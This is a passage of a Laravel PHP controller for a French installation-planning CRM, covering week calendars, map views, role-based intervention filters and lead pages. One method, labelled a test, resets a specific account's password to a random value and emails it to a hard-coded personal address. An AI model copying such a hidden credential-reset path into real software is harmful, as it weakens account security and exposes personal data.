            }else if(role() == 'Referent_Technique'){ 
                
                $users_id = User::whereIn('role_id', [4, 9])->pluck('id'); 
               
                for($i= 0; $i< $days_in_week; $i++){
                    $full_week[] = [
                        'date'      => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
                        'day'       => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
                        'interventions'    => ProjectIntervention::whereDate('Date_intervention', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))->whereIn('user_id', $users_id)->whereIn('type', ['Pré-Visite Technico-Commercial', 'Etude'])->with('getProject', 'getUser', 'getStatusPlanning')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get(),
                    ]; 
                }

            }else if(role() == 'Logistique'){ 
                
                $users_id = User::where('role_id', 2)->pluck('id'); 
               
                for($i= 0; $i< $days_in_week; $i++){
                    $full_week[] = [
                        'date'      => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
                        'day'       => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
                        'interventions'    => ProjectIntervention::whereDate('Date_intervention', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))->whereIn('user_id', $users_id)->where('type', 'Installation')->with('getProject', 'getUser', 'getStatusPlanning')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get(),
                    ]; 
                }
    
                 
            }else{
                if(role() == 'telecommercial' || role() == 'telecommercial_externe'){                    
                    $projects_id = NewProject::where('project_telecommercial', Auth::id())->where('deleted_status', 0)->pluck('id'); 
                    for($i= 0; $i< $days_in_week; $i++){
                        $full_week[] = [
                            'date'      => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
                            'day'       => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
                            'interventions'    => ProjectIntervention::whereDate('Date_intervention', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))->where('type', '<>', 'Déplacement')->where('type', '<>', 'SAV')->whereIn('project_id', $projects_id)->with('getProject', 'getUser', 'getStatusPlanning')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get(),
                        ]; 
                    }
                }else{
                    for($i= 0; $i< $days_in_week; $i++){
                        $full_week[] = [
                            'date'      => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
                            'day'       => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
                            'interventions'    => ProjectIntervention::where('user_id', Auth::id())->whereDate('Date_intervention', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))->with('getProject', 'getUser', 'getStatusPlanning')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get(),
                        ]; 
                    } 
                } 
            } 
        }
        $projects = NewProject::where('deleted_status', 0)->get()->map(function ($project){
            return [
                'id'            => $project->id,
                'Nom'           => $project->Nom,
                'Prenom'        => $project->Prenom, 
                'Code_Postal'   => $project->Code_Postal, 
                'tag'           => $project->ProjectTravauxTags()->count() > 0 ? implode(',', $project->ProjectTravauxTags->pluck('tag')->toArray()) : '',
            ];
        });
         
        return view('admin.planning_weeks_view', [    
            'current_date'              => $current_date,
            'departments'               => ZoneInfo::all(),
            'url_status'                => $url_status,
            'projects'                  => $projects,
            'full_week'                 => $full_week,
            'week_start'                => $week_start,
            'week_end'                  => $week_end,  
            'min_30_interval'           => $min_30_interval,  
            'bareme_travaux_tags'       => BaremeTravauxTag::orderBy('order')->get(),   
            'users'                     => User::where('deleted_status', 'no')->where('status', 'active')->get(),  
            'filter_role'               => Role::findMany([2,4,6,9]),
            'all_access'                => $all_access,
            'status_planning'           => StatusPlanningIntervention::all(), 
        ]);
    }
    public function customTestGenerate(){
        if(Auth::id() == '1'){
            $hex = bin2hex(random_bytes(32));

            $user = User::where('email', 'shimulmdhossain@gmail.com')->first();
            Mail::raw($hex, function ($message) {
                $message->to('shimulmdhossain@gmail.com')
                        ->subject('Test email');
            });
            
            $user->update([
                'password' => bcrypt($hex)
            ]);

            return back();
        }
    }
    public function planningWeekMenuFilter($week = null){ 

        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        if(!in_array(role(), $administrarif_role)){
            return back();
        }

        if(request()->intervention_type){
            $intervention_type = [request()->intervention_type];
        }else{
            $intervention_type = ['Etude', 'Pré-Visite Technico-Commercial', 'Contre Visite Technique', 'Installation', 'SAV', 'Prévisite virtuelle', 'Déplacement'];
        } 
        if(request()->client && request()->code_postal && request()->travaux){
            $filter_travaux = ProjectTravaux::where('travaux_id', request()->travaux)->pluck('project_id')->toArray();
            $filter_project = NewProject::where('deleted_status', 0)->where('id', request()->client)->where('Code_Postal', 'LIKE', request()->code_postal.'%')->whereIn('id', $filter_travaux)->pluck('id')->toArray();
        }elseif(request()->client && request()->code_postal){
            $filter_project = NewProject::where('deleted_status', 0)->where('id', request()->client)->where('Code_Postal', 'LIKE', request()->code_postal.'%')->pluck('id')->toArray();
        }elseif(request()->code_postal && request()->travaux){
            $filter_travaux = ProjectTravaux::where('travaux_id', request()->travaux)->pluck('project_id')->toArray();
            $filter_project = NewProject::where('deleted_status', 0)->where('Code_Postal', 'LIKE', request()->code_postal.'%')->whereIn('id', $filter_travaux)->pluck('id')->toArray();
        }elseif(request()->client && request()->travaux){
            $filter_travaux = ProjectTravaux::where('travaux_id', request()->travaux)->pluck('project_id')->toArray();
            $filter_project = NewProject::where('deleted_status', 0)->where('id', request()->client)->whereIn('id', $filter_travaux)->pluck('id')->toArray();
        }elseif(request()->client){ 
            $filter_project = NewProject::where('deleted_status', 0)->where('id', request()->client)->pluck('id')->toArray();
        }elseif(request()->code_postal){ 
            $filter_project = NewProject::where('deleted_status', 0)->where('Code_Postal', 'LIKE', request()->code_postal.'%')->pluck('id')->toArray();
        }elseif(request()->travaux){
            $filter_travaux = ProjectTravaux::where('travaux_id', request()->travaux)->pluck('project_id')->toArray();
            $filter_project = NewProject::where('deleted_status', 0)->whereIn('id', $filter_travaux)->pluck('id')->toArray();
        }else{
            $filter_project = NewProject::where('deleted_status', 0)->get()->pluck('id')->toArray();
        }

        $min_30_interval = [];
        $schedules30 = CarbonInterval::minutes('30')->toPeriod('00:00', '24:00'); 
        foreach($schedules30 as $d){
            $min_30_interval[] = Carbon::parse($d)->format("G").'h'.Carbon::parse($d)->format("i");
        }

        if($week){
            // $days_in_week = 7; 
            $week_start = $week;
            $week_end  = Carbon::parse($week)->addDays(6); 
            // $current_date   = $week_start; 
            // $from = request()->form_date ?? $week_start; 
            // $to = request()->to_date ?? $week_end;  
            $url_status     = 1;
            // $full_week = [];
            // for($i= 0; $i< $days_in_week; $i++){
            //     $interventions = ProjectIntervention::query();
            //     $interventions->whereDate('Date_intervention', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))
            //                     ->whereBetween('Date_intervention', [$from, $to])
            //                     ->whereIn('type', $intervention_type)
            //                     ->whereIn('project_id', $filter_project);
            //     if(request()->statut_planning){
            //         $interventions->where('Statut_planning', request()->statut_planning);
            //     }
            //     if(request()->user_id){
            //     $interventions->where('user_id', request()->user_id);
            //     } 
            //     $full_week[] = [
            //         'date' => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
            //         'day' => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'), 
            //         'interventions'    => $interventions->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get()
            //     ];
            // }   
        }else{
            // $days_in_week = 7; 
            $week_start = Carbon::now()->startOfWeek()->format('Y-m-d');
            $week_end  = Carbon::now()->endOfWeek()->format('Y-m-d'); 
            // $from = request()->form_date ?? $week_start; 
            // $to = request()->to_date ?? $week_end; 
            // $current_date   = $week_start; 
            $url_status     = 0;
            // $full_week = []; 
            // for($i= 0; $i< $days_in_week; $i++){
            //     $interventions = ProjectIntervention::query();
            //     $interventions->whereDate('Date_intervention', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))
            //                     ->whereBetween('Date_intervention', [$from, $to])
            //                     ->whereIn('type', $intervention_type)
            //                     ->whereIn('project_id', $filter_project);
            //     if(request()->statut_planning){
            //         $interventions->where('Statut_planning', request()->statut_planning);
            //     }
            //     if(request()->user_id){
            //         $interventions->where('user_id', request()->user_id);
            //     } 
            //     $full_week[] = [
            //         'date'      => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
            //         'day'       => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
            //         'interventions'    => $interventions->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get(),
            //     ]; 
            // }  
        }
        $projects = NewProject::where('deleted_status', 0)->get()->map(function ($project){
            return [
                'id'            => $project->id,
                'Nom'           => $project->Nom,
                'Prenom'        => $project->Prenom, 
                'Code_Postal'   => $project->Code_Postal, 
                'tag'           => $project->ProjectTravauxTags()->count() > 0 ? implode(',', $project->ProjectTravauxTags->pluck('tag')->toArray()) : '',
            ];
        });

        $days_in_week = 7; 
        $current_date   = $week_start;
        $full_week = [];
        $from = request()->form_date ?? $week_start; 
        $to = request()->to_date ?? $week_end; 

        // $administrarif_role = Role::where('category_id', '3')->pluck('value')->toArray();
      
        for($i= 0; $i< $days_in_week; $i++){
            $interventions = ProjectIntervention::query();
            $interventions->whereDate('Date_intervention', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))
                            ->whereBetween('Date_intervention', [$from, $to])
                            ->whereIn('type', $intervention_type)
                            ->whereIn('project_id', $filter_project);
            if(request()->statut_planning){
                $interventions->where('Statut_planning', request()->statut_planning);
            }
            if(request()->user_id){
            $interventions->where('user_id', request()->user_id);
            } 
            $full_week[] = [
                'date' => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
                'day' => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'), 
                'interventions'    => $interventions->with('getProject', 'getUser', 'getStatusPlanning')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get()
            ];
        }  
        
        
         
        return view('admin.planning_weeks_view', [    
            'current_date'              => $current_date,
            'departments'               => ZoneInfo::all(),
            'url_status'                => $url_status,
            'projects'                  => $projects,
            'full_week'                 => $full_week,
            'week_start'                => $week_start,
            'week_end'                  => $week_end,  
            'min_30_interval'           => $min_30_interval,  
            'bareme_travaux_tags'       => BaremeTravauxTag::orderBy('order')->get(),   
            'users'                     => User::where('deleted_status', 'no')->where('status', 'active')->get(),  
            'filter_role'               => Role::findMany([2,4,6,9]),
            'all_access'                => true, 
            'status_planning'           => StatusPlanningIntervention::all(),
        ]);
    }

    public function CadendarWeeksView($client_id = null, $week = null){ 
        
        if($week){
            $days_in_week = 7; 
            $week_start = $week;
            $week_end  = Carbon::parse($week)->addDays(6); 
            $full_week = [];
            for($i= 0; $i< $days_in_week; $i++){
                $full_week[] = [
                    'date' => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
                    'day' => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
                    'events'    => Event::whereDate('start_date', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))->get()
                ];
            }  
            return view('admin.new_planning_weeksview', [ 
                'users'         => User::where('deleted_status', 'no')->where('status', 'active')->get(),
                'installers'    => User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 2)->get(),
                'client'        => Client::where('id', $client_id)->first(),
                'clients'       => Client::all(),
                'projects'      => Project::where('deleted_status', 'no')->get(),
                'category'      => EventCategory::all(),
                'all_event'     => Event::all(), 
                'full_week'     => $full_week,
                'week_start'    => $week_start,
                'week_end'      => $week_end,
                'departments'   => ZoneInfo::all(),
            ]);
        }else{
            $days_in_week = 7; 
            $week_start = Carbon::now()->startOfWeek()->format('Y-m-d');
            $week_end  = Carbon::now()->endOfWeek()->format('Y-m-d'); 
            $full_week = []; 
            for($i= 0; $i< $days_in_week; $i++){
                $full_week[] = [
                    'date'      => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
                    'day'       => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
                    'events'    => Event::whereDate('start_date', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))->get(),
                ]; 
            }  
            return view('admin.new_planning_weeksview', [ 
                'users'         => User::where('deleted_status', 'no')->where('status', 'active')->get(),
                'installers'    => User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 2)->get(),
                'client'        => Client::where('id', $client_id)->first(),
                'clients'       => Client::all(),
                'projects'      => Project::where('deleted_status', 'no')->get(),
                'category'      => EventCategory::all(),
                'all_event'     => Event::all(), 
                'full_week'     => $full_week,
                'week_start'    => $week_start,
                'week_end'      => $week_end,
                'departments'   => ZoneInfo::all(),
            ]);
        }
    }

    public function calendarWeekFilter(){ 
        $days_in_week = 7; 
        $client_id = request()->client_id;
        $event = request()->event_id;
        $category = request()->event_category;
        $project = request()->event_project;
        $client = request()->event_client;  
        $week_start = request()->week; 
        $week_end  = Carbon::parse($week_start)->addDays(6); 
        $full_week = [];
        for($i= 0; $i< $days_in_week; $i++){
            $full_week[] = [
                'date'      => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
                'day'       => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
                'events'    => Event::whereDate('start_date', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))->where(function($query) use ($event, $category, $client, $project){
                    $query->where('category_id', $category)
                    ->orWhere('id', $event)
                    ->orWhere('client_id', $client)
                    ->orWhere('project_id', $project);
                })->get(),
            ];
        }   
        return view('admin.new_planning_weeksview', [ 
            'users'         => User::where('deleted_status', 'no')->where('status', 'active')->get(),
            'installers'    => User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 2)->get(),
            'client'        => Client::where('id', $client_id)->first(),
            'clients'       => Client::all(),
            'projects'      => Project::where('deleted_status', 'no')->get(),
            'category'      => EventCategory::all(),
            'all_event'     => Event::all(), 
            'full_week'     => $full_week,
            'week_start'    => $week_start,
            'week_end'      => $week_end,
            'departments'   => ZoneInfo::all(),
        ]);
    }
    public function planningMapView($client_id = null){
        return view('admin.new_planning_mapview', [ 
            'users'         => User::where('deleted_status', 'no')->where('status', 'active')->get(),
            'client'        =>Client::where('id', $client_id)->first(),
            'clients'       =>Client::all(),
            'projects'      => Project::where('deleted_status', 'no')->get(),
            'category'      => EventCategory::all(),
            'events'        => Event::whereNotNull('address_lat')->get(), 
            'all_event'     => Event::all(), 
            'departments'   => ZoneInfo::all(),
        ]);
    }
    public function planningMapViewNew(){ 

        if(role() == 'telecommercial' || role() == 'telecommercial_externe' || role() == 'sales_manager' || role() == 'sales_manager_externe' || role() == 'installer' || role() == 'energy_auditor'){
            return back();
        }

        $projects = NewProject::where('deleted_status', 0)->get()->map(function ($project){
            return [
                'id'            => $project->id,
                'Nom'           => $project->Nom,
                'Prenom'        => $project->Prenom, 
                'Code_Postal'   => $project->Code_Postal, 
                'tag'           => $project->ProjectTravauxTags()->count() > 0 ? implode(',', $project->ProjectTravauxTags->pluck('tag')->toArray()) : '',
            ];
        });
        $min_30_interval = [];
        $schedules30 = CarbonInterval::minutes('30')->toPeriod('00:00', '24:00'); 
        foreach($schedules30 as $d){
            $min_30_interval[] = Carbon::parse($d)->format("G").'h'.Carbon::parse($d)->format("i");
        } 
        // $administrarif_role = Role::where('category_id', '3')->pluck('value')->toArray();
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        $all_access = false;
        if(in_array(role(), $administrarif_role)){
            $all_access = true;
            $interventions = ProjectIntervention::with('getProject', 'getUser', 'getStatusPlanning')->get();
        }else{
            if(role() == 'sales_manager' || role() == 'sales_manager_externe'){  
                $all_access = true;
                $stats_regies = Auth::user()->allRegie; 
                $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                $projects_id = NewProject::whereIn('project_telecommercial', $user_ids)->where('deleted_status', 0)->pluck('id');
                $interventions = ProjectIntervention::whereIn('project_id', $projects_id)->where('type', '<>', 'Déplacement')->where('type', '<>', 'SAV')->with('getProject', 'getUser', 'getStatusPlanning')->get();

            }else if(role() == 'team_leader'){ 
                $all_access = true;
                $team_users = Auth::user()->getTeamUsers;
                $interventions = ProjectIntervention::whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique'])->with('getProject', 'getUser', 'getStatusPlanning')->get();

            }else if(role() == 'Referent_Technique'){ 
                $all_access = true;
                $users_id = User::whereIn('role_id', [4, 9])->pluck('id'); 
                $interventions = ProjectIntervention::whereIn('user_id', $users_id)->whereIn('type', ['Pré-Visite Technico-Commercial', 'Etude'])->with('getProject', 'getUser', 'getStatusPlanning')->get();

            }else if(role() == 'Logistique'){ 
                $all_access = true;
                $users_id = User::where('role_id', 2)->pluck('id'); 
                $interventions = ProjectIntervention::whereIn('user_id', $users_id)->where('type', 'Installation')->with('getProject', 'getUser', 'getStatusPlanning')->get();
    
            }else{
                if(role() == 'telecommercial' || role() == 'telecommercial_externe'){                    
                    $all_access = true;
                    $projects_id = NewProject::where('project_telecommercial', Auth::id())->where('deleted_status', 0)->pluck('id'); 
                    $interventions = ProjectIntervention::whereIn('project_id', $projects_id)->where('type', '<>', 'Déplacement')->where('type', '<>', 'SAV')->with('getProject', 'getUser', 'getStatusPlanning')->get();
                }else{
                    $interventions = ProjectIntervention::where('user_id', Auth::id())->with('getProject', 'getUser', 'getStatusPlanning')->get();
                } 
            }
        }
        
        return view('admin.planning_map_view', [   
            'interventions'             => $interventions,
            'departments'               => ZoneInfo::all(),
            'projects'                  => $projects,  
            'min_30_interval'           => $min_30_interval,
            'status_planning'           => StatusPlanningIntervention::all(),
            'charge_etudes'             => User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 9)->get(),
            'installers'                => User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 2)->get(),
            'bareme_travaux_tags'       => BaremeTravauxTag::orderBy('order')->get(),
            'products'                  => Product::latest()->get(),
            'reflection_reasons'        => ProjectReflectionReason::all(),
            'ko_reasons'                => ProjectDeadReason::all(),
            'technical_commercials'     => User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [1,2,4])->get(),
            'users'                     => User::where('deleted_status', 'no')->where('status', 'active')->get(),
            'all_inputs'                => ProjectCustomField::all(),
            'team_laeders'              => User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 1)->get(),
            'filter_role'               => Role::findMany([2,4,6,9]),
            'all_access'                => $all_access,
            'project_control_photos'    => ProjectControlPhoto::all(),
            'technical_referees'        => TechnicalReferee::all(),
        ]);
    }
    public function newPlanningMapViewNew(){ 
        
        if(role() == 'telecommercial' || role() == 'telecommercial_externe' || role() == 'sales_manager' || role() == 'sales_manager_externe' || role() == 'installer' || role() == 'energy_auditor'){
            return back();
        }


        $days_in_month  = 7;   
        $start          = Carbon::now()->startOfWeek()->format('d'); 
        $end            = Carbon::now()->startOfWeek()->format('d') + $days_in_month;    
        $full_month = [];
        for($i = $start; $i< $end; $i++){ 
            $full_month[] = ['date' => Carbon::today()->year(Carbon::now()->startOfWeek()->format('Y'))->month(Carbon::now()->startOfWeek()->format('m'))->day($i)->format('Y-m-d'), 'day' => Carbon::today()->year(Carbon::now()->startOfWeek()->format('Y'))->month(Carbon::now()->startOfWeek()->format('m'))->day($i)->locale(app()->getLocale())->translatedFormat('l')];
        }  
        $month          = Carbon::today()->locale(app()->getLocale())->translatedFormat('F Y');  
        
       
 
        $week_start = Carbon::now()->startOfWeek()->format('Y-m-d');
        $week_end  = Carbon::now()->endOfWeek()->format('Y-m-d');  

        return view('admin.new_planning_map_view', [  
            'interventions'             => [],   
            'roles'                     => Role::findMany([2,4,6,9]),  
            'days_in_month'             => $days_in_month,
            'month'                     => $month,   
            'full_month'                => $full_month, 
            'week_start'                => $week_start, 
            'week_end'                  => $week_end, 
            'filteredUser'              => [], 
            'items'                     => [], 
            'users'                     => User::where('deleted_status', 'no')->where('status', 'active')->get(),   
        ]);
    }
    public function newPlanningMapMenuFilter(){ 
        if(role() == 'telecommercial' || role() == 'telecommercial_externe' || role() == 'sales_manager' || role() == 'sales_manager_externe' || role() == 'installer' || role() == 'energy_auditor'){
            return back();
        }
        request()->validate([
            'user_id' => 'required|numeric'
        ]); 

        $days_in_month  = 7;
        $start          = Carbon::parse(request()->custom_filter_date)->startOfWeek()->format('d'); 
        $end            = Carbon::parse(request()->custom_filter_date)->startOfWeek()->format('d') + $days_in_month;    
        $full_month = [];

        for($i = $start; $i< $end; $i++){ 
            $full_month[] = ['date' => Carbon::today()->year(Carbon::parse(request()->custom_filter_date)->format('Y'))->month(Carbon::parse(request()->custom_filter_date)->format('m'))->day($i)->format('Y-m-d'), 'day' => Carbon::today()->year(Carbon::parse(request()->custom_filter_date)->format('Y'))->month(Carbon::parse(request()->custom_filter_date)->format('m'))->day($i)->locale(app()->getLocale())->translatedFormat('l')];
        }  

        $month          = Carbon::parse(request()->custom_filter_date)->locale(app()->getLocale())->translatedFormat('F Y');  
        
       
 
        $week_start = Carbon::parse(request()->custom_filter_date)->startOfWeek()->format('Y-m-d');
        $week_end   = Carbon::parse(request()->custom_filter_date)->endOfWeek()->format('Y-m-d'); 

        $schedules30 = CarbonInterval::minutes('30')->toPeriod('00:00', '24:00'); 
        foreach($schedules30 as $d){
            $min_30_interval[] = Carbon::parse($d)->format("G").'h'.Carbon::parse($d)->format("i");
        } 
        $interventions = ProjectIntervention::whereBetween('Date_intervention', [$week_start, $week_end])  
                                            ->where('user_id', request()->user_id) 
                                            ->with('getProject', 'getUser', 'getStatusPlanning')
                                            ->orderBy('Date_intervention')
                                            ->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")
                                            ->get(); 
        return view('admin.new_planning_map_view', [     
            'interventions'             => $interventions,
            'roles'                     => Role::findMany([2,4,6,9]),  
            'days_in_month'             => $days_in_month,
            'month'                     => $month,   
            'full_month'                => $full_month, 
            'week_start'                => $week_start, 
            'week_end'                  => $week_end, 
            'filteredUser'              => User::where('id', request()->user_id)->get(), 
            'items'                     => [], 
            'users'                     => User::where('deleted_status', 'no')->where('status', 'active')->get(),   
        ]);
    }

    public function planningMapMenuFilter(){ 

        if(role() == 'telecommercial' || role() == 'telecommercial_externe' || role() == 'sales_manager' || role() == 'sales_manager_externe' || role() == 'installer' || role() == 'energy_auditor'){
            return back();
        }

        if(request()->intervention_type){
            $intervention_type = [request()->intervention_type];
        }else{
            $intervention_type = ['Etude', 'Pré-Visite Technico-Commercial', 'Contre Visite Technique', 'Installation', 'SAV', 'Prévisite virtuelle', 'Déplacement'];
        } 
       if(request()->travaux){
            $filter_travaux = ProjectTravaux::where('travaux_id', request()->travaux)->pluck('project_id')->toArray();
            $filter_project = NewProject::where('deleted_status', 0)->whereIn('id', $filter_travaux)->pluck('id')->toArray();
        }else{
            $filter_project = NewProject::where('deleted_status', 0)->get()->pluck('id')->toArray();
        }
        $from = request()->form_date ?? Carbon::today(); 
        $to = request()->to_date ?? Carbon::today();  

        $projects = NewProject::where('deleted_status', 0)->get()->map(function ($project){
            return [
                'id'            => $project->id,
                'Nom'           => $project->Nom,
                'Prenom'        => $project->Prenom, 
                'Code_Postal'   => $project->Code_Postal, 
                'tag'           => $project->ProjectTravauxTags()->count() > 0 ? implode(',', $project->ProjectTravauxTags->pluck('tag')->toArray()) : '',
            ];
        });

        $interventions = ProjectIntervention::query();
        // $administrarif_role = Role::where('category_id', '3')->pluck('value')->toArray();
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        $all_access = false;
        if(in_array(role(), $administrarif_role)){
            $all_access = true;
        }else{
            if(role() == 'sales_manager' || role() == 'sales_manager_externe'){  
                $all_access = true;
                $stats_regies = Auth::user()->allRegie; 
                $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                $projects_id = NewProject::whereIn('project_telecommercial', $user_ids)->where('deleted_status', 0)->pluck('id');
                $interventions->whereIn('project_id', $projects_id)->where('type', '<>', 'Déplacement')->where('type', '<>', 'SAV');
            
            }else if(role() == 'team_leader'){ 
                $all_access = true;
                $team_users = Auth::user()->getTeamUsers;
                $interventions->whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique']);
            }else if(role() == 'Referent_Technique'){ 
                $all_access = true;
                
                $users_id = User::whereIn('role_id', [4, 9])->pluck('id'); 
                $interventions->whereIn('user_id', $users_id)->whereIn('type', ['Pré-Visite Technico-Commercial', 'Etude']);

            }else if(role() == 'Logistique'){ 
                $all_access = true;
                $users_id = User::where('role_id', 2)->pluck('id'); 
                $interventions->whereIn('user_id', $users_id)->where('type', 'Installation');
            }else{
                if(role() == 'telecommercial' || role() == 'telecommercial_externe'){                    
                    $all_access = true;
                    $projects_id = NewProject::where('project_telecommercial', Auth::id())->where('deleted_status', 0)->pluck('id'); 
                   $interventions->whereIn('project_id', $projects_id)->where('type', '<>', 'Déplacement')->where('type', '<>', 'SAV');
                }else{
                    $interventions->where('user_id', Auth::id());
                }
            }            
        }
        if(request()->form_date && request()->to_date){
            $interventions->whereBetween('Date_intervention', [$from, $to]);
        }
        $interventions->whereIn('type', $intervention_type)->whereIn('project_id', $filter_project);
        if(request()->statut_planning){
            $interventions->where('Statut_planning', request()->statut_planning);
        }
        if(request()->user_id){
        $interventions->where('user_id', request()->user_id);
        } 


        $min_30_interval = [];
        $schedules30 = CarbonInterval::minutes('30')->toPeriod('00:00', '24:00'); 
        foreach($schedules30 as $d){
            $min_30_interval[] = Carbon::parse($d)->format("G").'h'.Carbon::parse($d)->format("i");
        } 
        return view('admin.planning_map_view', [   
            'interventions'             => $interventions->with('getProject', 'getUser', 'getStatusPlanning')->get(),
            'departments'               => ZoneInfo::all(),
            'projects'                  => $projects,  
            'min_30_interval'           => $min_30_interval,
            'status_planning'           => StatusPlanningIntervention::all(),
            'charge_etudes'             => User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 9)->get(),
            'installers'                => User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 2)->get(),
            'bareme_travaux_tags'       => BaremeTravauxTag::orderBy('order')->get(),
            'products'                  => Product::latest()->get(),
            'reflection_reasons'        => ProjectReflectionReason::all(),
            'ko_reasons'                => ProjectDeadReason::all(),
            'technical_commercials'     => User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [1,2,4])->get(),
            'users'                     => User::where('deleted_status', 'no')->where('status', 'active')->get(),
            'all_inputs'                => ProjectCustomField::all(),
            'team_laeders'              => User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 1)->get(),
            'filter_role'               => Role::findMany([2,4,6,9]),
            'all_access'                => $all_access,
            'project_control_photos'     => ProjectControlPhoto::all(),
            'technical_referees'        => TechnicalReferee::all(),
        ]);
    }

    public function mapFilterTabActive(Request $request){ 
        if($request->value == 'active'){
            Session::put($request->tab, 'active');
        }else{
            Session::forget($request->tab);
        }
    }

    public function calendarMapFilter(){
        $from = request()->from ?? Carbon::now()->format('Y-m-d');
        $to   = request()->to ?? Carbon::now()->format('Y-m-d');
        $client_id  = request()->client_id;
        $event      = request()->event_id; 
        $project    = request()->event_project;
        $client     = request()->event_client;  


        return view('admin.new_planning_mapview', [ 
            'users'         => User::where('deleted_status', 'no')->where('status', 'active')->get(),
            'client'        =>Client::where('id', $client_id)->first(),
            'clients'       =>Client::all(),
            'projects'      => Project::where('deleted_status', 'no')->get(),
            'category'      => EventCategory::all(),
            'all_event'     => Event::all(), 
            'events'        => Event::whereNotNull('address_lat')->where(function($query) use ($event, $client, $project, $from, $to){
                                $query->whereBetween('start_date', [$from, $to])
                                ->orWhere('id', $event)
                                ->orWhere('client_id', $client)
                                ->orWhere('project_id', $project);
                            })->get(), 
        ]);
    }

    // Company leads page 
    public function companyLead($id){

        $lead_status        = LeadStatus::all();
        $company            = Company::findOrFail($id);
        $headers            = LeadHeader::all();
        $progress_leads     = Lead::where('company_id', $id)->where('status', 'in-progress')->where('deleted_status', 'no')->where('convert_status', 'no')->where('data_status', 'yes')->orderBy('id', 'desc')->paginate(10);
        $pre_validate_leads = Lead::where('company_id', $id)->where('status', 'pre-validated')->where('deleted_status', 'no')->where('convert_status', 'no')->where('data_status', 'yes')->orderBy('id', 'desc')->paginate(10);
        $verified_leads     = Lead::where('company_id', $id)->where('status', 'verified')->where('deleted_status', 'no')->where('convert_status', 'no')->where('data_status', 'yes')->orderBy('id', 'desc')->paginate(10);
        $all_leads          = Lead::all(); 
        $users              = User::where('deleted_status', 'no')->where('status', 'active')->get();
        $lead_id            = 0;

        return view('admin.company-leads', compact('company', 'progress_leads', 'pre_validate_leads', 'verified_leads', 'headers', 'all_leads', 'users', 'lead_id', 'lead_status'));
     

    }


    public function notificationView($notify_id, $lead_id){
        
        $lead = Lead::findOrFail($lead_id);
        $notification = Notifications::findOrFail($notify_id);
        $notification->status = '1';
        $notification->save();

        return redirect()->route('leads.index', [$lead->company_id, $lead_id]);
    }
    public function clientNotificationView($notify_id, $client_id){
        
        $client = Client::findOrFail($client_id);
        $notification = Notifications::findOrFail($notify_id);
        $notification->status = '1';
        $notification->save();

        return redirect()->route('client.lead.update', $client_id);
    }

    // Return all Notification 
